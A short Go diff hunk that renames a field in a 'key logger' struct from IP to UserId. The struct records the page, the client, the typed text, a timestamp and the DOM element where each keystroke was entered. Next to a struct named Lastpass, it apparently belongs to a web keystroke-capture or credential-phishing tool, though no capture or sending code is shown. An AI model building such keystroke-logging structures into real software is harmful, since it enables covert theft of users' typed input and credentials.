@@ -30,7 +30,7 @@ type Lastpass struct {
 //key logger object
 type KeyLog struct {
     Page string //what page they were on when they typed it
-    IP string //which client typed it
+    UserId string //which client typed it
     Content string //what was typed
     Timestamp string //the time at which it was typed
     DomObject string //where the data was typed
